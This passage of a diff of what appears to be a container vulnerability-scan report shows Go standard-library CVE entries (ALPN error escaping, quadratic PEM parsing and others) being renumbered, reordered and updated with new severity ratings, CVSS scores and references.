-│                       │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
-│                       │      │                            │           N/A:N 
-│                       │      │                            ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1]: https://go.dev/cl/707776 
-│                       │      │                  ├ [2]: https://go.dev/issue/75652 
-│                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-│                       │      │                  │      _bI 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
-│                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4008 
-│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
-│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
-│                       ├ [19] ╭ VulnerabilityID : CVE-2025-61723 
-│                       │      ├ PkgID           : stdlib@v1.24.4 
-│                       │      ├ PkgName         : stdlib 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
-│                       │      │                  ╰ UID : 2bd9acee40f6eed 
-│                       │      ├ InstalledVersion: v1.24.4 
-│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
-│                       │      ├ DataSource       ╭ ID  : govulndb 
-│                       │      │                  ├ Name: The Go Vulnerability Database 
-│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                       │      ├ Title           : The processing time for parsing some invalid inputs scales
-│                       │      │                   non-linearl ... 
-│                       │      ├ Description     : The processing time for parsing some invalid inputs scales
-│                       │      │                   non-linearly with respect to the size of the input. This
-│                       │      │                   affects programs which parse untrusted PEM inputs. 
-│                       │      ├ Severity        : HIGH 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ╰ bitnami: 3 
-│                       │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
-│                       │      │                            │           N/A:H 
-│                       │      │                            ╰ V3Score : 7.5 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1]: https://go.dev/cl/709858 
-│                       │      │                  ├ [2]: https://go.dev/issue/75676 
-│                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-│                       │      │                  │      _bI 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
-│                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4009 
-│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
-│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
-│                       ├ [20] ╭ VulnerabilityID : CVE-2025-61724 
+│                       ├ [18] ╭ VulnerabilityID : CVE-2025-61724 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -29846,7 +30239,7 @@
 │                       │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4015 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:20.02Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.567Z 
-│                       ├ [21] ╭ VulnerabilityID : CVE-2025-47906 
+│                       ├ [19] ╭ VulnerabilityID : CVE-2025-47906 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -29889,7 +30282,7 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-47906 
 │                       │      ├ PublishedDate   : 2025-09-18T19:15:37.66Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:16.207Z 
-│                       ├ [22] ╭ VulnerabilityID : CVE-2025-58185 
+│                       ├ [20] ╭ VulnerabilityID : CVE-2025-58185 
 │                       │      ├ PkgID           : stdlib@v1.24.4 
 │                       │      ├ PkgName         : stdlib 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
@@ -29932,6 +30325,92 @@
 │                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-58185 
 │                       │      ├ PublishedDate   : 2025-10-29T23:16:19.45Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.327Z 
+│                       ├ [21] ╭ VulnerabilityID : CVE-2025-58189 
+│                       │      ├ PkgID           : stdlib@v1.24.4 
+│                       │      ├ PkgName         : stdlib 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
+│                       │      │                  ╰ UID : 2bd9acee40f6eed 
+│                       │      ├ InstalledVersion: v1.24.4 
+│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
+│                       │      ├ DataSource       ╭ ID  : govulndb 
+│                       │      │                  ├ Name: The Go Vulnerability Database 
+│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                       │      ├ Title           : crypto/tls: go crypto/tls ALPN negotiation error contains
+│                       │      │                   attacker controlled information 
+│                       │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
+│                       │      │                   contains attacker controlled information (the ALPN protocols
+│                       │      │                    sent by the client) which is not escaped. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ╭ amazon : 3 
+│                       │      │                  ├ bitnami: 2 
+│                       │      │                  ╰ redhat : 2 
+│                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                       │      │                  │         │           N/A:N 
+│                       │      │                  │         ╰ V3Score : 5.3 
+│                       │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                            │           L/A:N 
+│                       │      │                            ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-58189 
+│                       │      │                  ├ [2]: https://go.dev/cl/707776 
+│                       │      │                  ├ [3]: https://go.dev/issue/75652 
+│                       │      │                  ├ [4]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+│                       │      │                  │      _bI 
+│                       │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
+│                       │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-4008 
+│                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-58189 
+│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
+│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
+│                       ├ [22] ╭ VulnerabilityID : CVE-2025-61723 
+│                       │      ├ PkgID           : stdlib@v1.24.4 
+│                       │      ├ PkgName         : stdlib 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.4 
+│                       │      │                  ╰ UID : 2bd9acee40f6eed 
+│                       │      ├ InstalledVersion: v1.24.4 
+│                       │      ├ FixedVersion    : 1.24.8, 1.25.2 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
+│                       │      ├ DataSource       ╭ ID  : govulndb 
+│                       │      │                  ├ Name: The Go Vulnerability Database 
+│                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                       │      ├ Title           : encoding/pem: Quadratic complexity when parsing some invalid
+│                       │      │                    inputs in encoding/pem 
+│                       │      ├ Description     : The processing time for parsing some invalid inputs scales
+│                       │      │                   non-linearly with respect to the size of the input. This
+│                       │      │                   affects programs which parse untrusted PEM inputs. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ╭ amazon : 3 
+│                       │      │                  ├ bitnami: 3 
+│                       │      │                  ╰ redhat : 2 
+│                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                  │         │           N/A:H 
+│                       │      │                  │         ╰ V3Score : 7.5 
+│                       │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                       │      │                            │           N/A:L 
+│                       │      │                            ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-61723 
+│                       │      │                  ├ [2]: https://github.com/golang/go/commit/5ce8cd16f3859ec5ac
+│                       │      │                  │      4106ad8ec15d6236f4501b 
+│                       │      │                  ├ [3]: https://go.dev/cl/709858 
+│                       │      │                  ├ [4]: https://go.dev/issue/75676 
+│                       │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+│                       │      │                  │      _bI 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4009 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61723 
+│                       │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
+│                       │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
 │                       ╰ [23] ╭ VulnerabilityID : CVE-2025-61725 
 │                              ├ PkgID           : stdlib@v1.24.4 
 │                              ├ PkgName         : stdlib 
@@ -30252,79 +30731,7 @@
                         │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4013 
                         │      ├ PublishedDate   : 2025-10-29T23:16:19.74Z 
                         │      ╰ LastModifiedDate: 2025-11-04T22:16:33.74Z 
-                        ├ [6]  ╭ VulnerabilityID : CVE-2025-58189 
-                        │      ├ PkgID           : stdlib@v1.24.5 
-                        │      ├ PkgName         : stdlib 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
-                        │      │                  ╰ UID : 7927e62558d558ff 
-                        │      ├ InstalledVersion: v1.24.5 
-                        │      ├ FixedVersion    : 1.24.8, 1.25.2 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-                        │      │                  │         501dd6062bd50a4b6afe 
-                        │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-                        │      │                            c7d38461b41e40aab9e7 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
-                        │      ├ DataSource       ╭ ID  : govulndb 
-                        │      │                  ├ Name: The Go Vulnerability Database 
-                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-                        │      ├ Title           : When Conn.Handshake fails during ALPN negotiation the error
-                        │      │                   contains a ... 
-                        │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
-                        │      │                   contains attacker controlled information (the ALPN protocols
-                        │      │                    sent by the client) which is not escaped. 
-                        │      ├ Severity        : HIGH 
-                        │      ├ VendorSeverity   ╭ amazon : 3 
-                        │      │                  ╰ bitnami: 2 
-                        │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
-                        │      │                            │           N/A:N 
-                        │      │                            ╰ V3Score : 5.3 
-                        │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-                        │      │                  ├ [1]: https://go.dev/cl/707776 
-                        │      │                  ├ [2]: https://go.dev/issue/75652 
-                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-                        │      │                  │      _bI 
-                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
-                        │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4008 
-                        │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
-                        │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
-                        ├ [7]  ╭ VulnerabilityID : CVE-2025-61723 
-                        │      ├ PkgID           : stdlib@v1.24.5 
-                        │      ├ PkgName         : stdlib 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
-                        │      │                  ╰ UID : 7927e62558d558ff 
-                        │      ├ InstalledVersion: v1.24.5 
-                        │      ├ FixedVersion    : 1.24.8, 1.25.2 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-                        │      │                  │         501dd6062bd50a4b6afe 
-                        │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-                        │      │                            c7d38461b41e40aab9e7 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
-                        │      ├ DataSource       ╭ ID  : govulndb 
-                        │      │                  ├ Name: The Go Vulnerability Database 
-                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-                        │      ├ Title           : The processing time for parsing some invalid inputs scales
-                        │      │                   non-linearl ... 
-                        │      ├ Description     : The processing time for parsing some invalid inputs scales
-                        │      │                   non-linearly with respect to the size of the input. This
-                        │      │                   affects programs which parse untrusted PEM inputs. 
-                        │      ├ Severity        : HIGH 
-                        │      ├ VendorSeverity   ╭ amazon : 3 
-                        │      │                  ╰ bitnami: 3 
-                        │      ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
-                        │      │                            │           N/A:H 
-                        │      │                            ╰ V3Score : 7.5 
-                        │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
-                        │      │                  ├ [1]: https://go.dev/cl/709858 
-                        │      │                  ├ [2]: https://go.dev/issue/75676 
-                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
-                        │      │                  │      _bI 
-                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
-                        │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4009 
-                        │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
-                        │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
-                        ├ [8]  ╭ VulnerabilityID : CVE-2025-61724 
+                        ├ [6]  ╭ VulnerabilityID : CVE-2025-61724 
                         │      ├ PkgID           : stdlib@v1.24.5 
                         │      ├ PkgName         : stdlib 
                         │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
@@ -30361,7 +30768,7 @@
                         │      │                  ╰ [5]: https://pkg.go.dev/vuln/GO-2025-4015 
                         │      ├ PublishedDate   : 2025-10-29T23:16:20.02Z 
                         │      ╰ LastModifiedDate: 2025-11-04T22:16:36.567Z 
-                        ├ [9]  ╭ VulnerabilityID : CVE-2025-47906 
+                        ├ [7]  ╭ VulnerabilityID : CVE-2025-47906 
                         │      ├ PkgID           : stdlib@v1.24.5 
                         │      ├ PkgName         : stdlib 
                         │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
@@ -30404,7 +30811,7 @@
                         │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-47906 
                         │      ├ PublishedDate   : 2025-09-18T19:15:37.66Z 
                         │      ╰ LastModifiedDate: 2025-11-04T22:16:16.207Z 
-                        ├ [10] ╭ VulnerabilityID : CVE-2025-58185 
+                        ├ [8]  ╭ VulnerabilityID : CVE-2025-58185 
                         │      ├ PkgID           : stdlib@v1.24.5 
                         │      ├ PkgName         : stdlib 
                         │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
@@ -30447,6 +30854,92 @@
                         │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-58185 
                         │      ├ PublishedDate   : 2025-10-29T23:16:19.45Z 
                         │      ╰ LastModifiedDate: 2025-11-04T22:16:33.327Z 
+                        ├ [9]  ╭ VulnerabilityID : CVE-2025-58189 
+                        │      ├ PkgID           : stdlib@v1.24.5 
+                        │      ├ PkgName         : stdlib 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
+                        │      │                  ╰ UID : 7927e62558d558ff 
+                        │      ├ InstalledVersion: v1.24.5 
+                        │      ├ FixedVersion    : 1.24.8, 1.25.2 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+                        │      │                  │         501dd6062bd50a4b6afe 
+                        │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+                        │      │                            c7d38461b41e40aab9e7 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58189 
+                        │      ├ DataSource       ╭ ID  : govulndb 
+                        │      │                  ├ Name: The Go Vulnerability Database 
+                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+                        │      ├ Title           : crypto/tls: go crypto/tls ALPN negotiation error contains
+                        │      │                   attacker controlled information 
+                        │      ├ Description     : When Conn.Handshake fails during ALPN negotiation the error
+                        │      │                   contains attacker controlled information (the ALPN protocols
+                        │      │                    sent by the client) which is not escaped. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ╭ amazon : 3 
+                        │      │                  ├ bitnami: 2 
+                        │      │                  ╰ redhat : 2 
+                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+                        │      │                  │         │           N/A:N 
+                        │      │                  │         ╰ V3Score : 5.3 
+                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+                        │      │                            │           L/A:N 
+                        │      │                            ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+                        │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-58189 
+                        │      │                  ├ [2]: https://go.dev/cl/707776 
+                        │      │                  ├ [3]: https://go.dev/issue/75652 
+                        │      │                  ├ [4]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+                        │      │                  │      _bI 
+                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-58189 
+                        │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-4008 
+                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-58189 
+                        │      ├ PublishedDate   : 2025-10-29T23:16:19.833Z 
+                        │      ╰ LastModifiedDate: 2025-11-04T22:16:33.877Z 
+                        ├ [10] ╭ VulnerabilityID : CVE-2025-61723 
+                        │      ├ PkgID           : stdlib@v1.24.5 
+                        │      ├ PkgName         : stdlib 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.5 
+                        │      │                  ╰ UID : 7927e62558d558ff 
+                        │      ├ InstalledVersion: v1.24.5 
+                        │      ├ FixedVersion    : 1.24.8, 1.25.2 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+                        │      │                  │         501dd6062bd50a4b6afe 
+                        │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+                        │      │                            c7d38461b41e40aab9e7 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-61723 
+                        │      ├ DataSource       ╭ ID  : govulndb 
+                        │      │                  ├ Name: The Go Vulnerability Database 
+                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
+                        │      ├ Title           : encoding/pem: Quadratic complexity when parsing some invalid
+                        │      │                    inputs in encoding/pem 
+                        │      ├ Description     : The processing time for parsing some invalid inputs scales
+                        │      │                   non-linearly with respect to the size of the input. This
+                        │      │                   affects programs which parse untrusted PEM inputs. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ╭ amazon : 3 
+                        │      │                  ├ bitnami: 3 
+                        │      │                  ╰ redhat : 2 
+                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+                        │      │                  │         │           N/A:H 
+                        │      │                  │         ╰ V3Score : 7.5 
+                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+                        │      │                            │           N/A:L 
+                        │      │                            ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/10/08/1 
+                        │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-61723 
+                        │      │                  ├ [2]: https://github.com/golang/go/commit/5ce8cd16f3859ec5ac
+                        │      │                  │      4106ad8ec15d6236f4501b 
+                        │      │                  ├ [3]: https://go.dev/cl/709858 
+                        │      │                  ├ [4]: https://go.dev/issue/75676 
+                        │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/4Emdl2iQ
+                        │      │                  │      _bI 
+                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61723 
+                        │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4009 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61723 
+                        │      ├ PublishedDate   : 2025-10-29T23:16:19.927Z 
+                        │      ╰ LastModifiedDate: 2025-11-04T22:16:36.42Z 
                         ╰ [11] ╭ VulnerabilityID : CVE-2025-61725 
                                ├ PkgID           : stdlib@v1.24.5 
                                ├ PkgName         : stdlib 
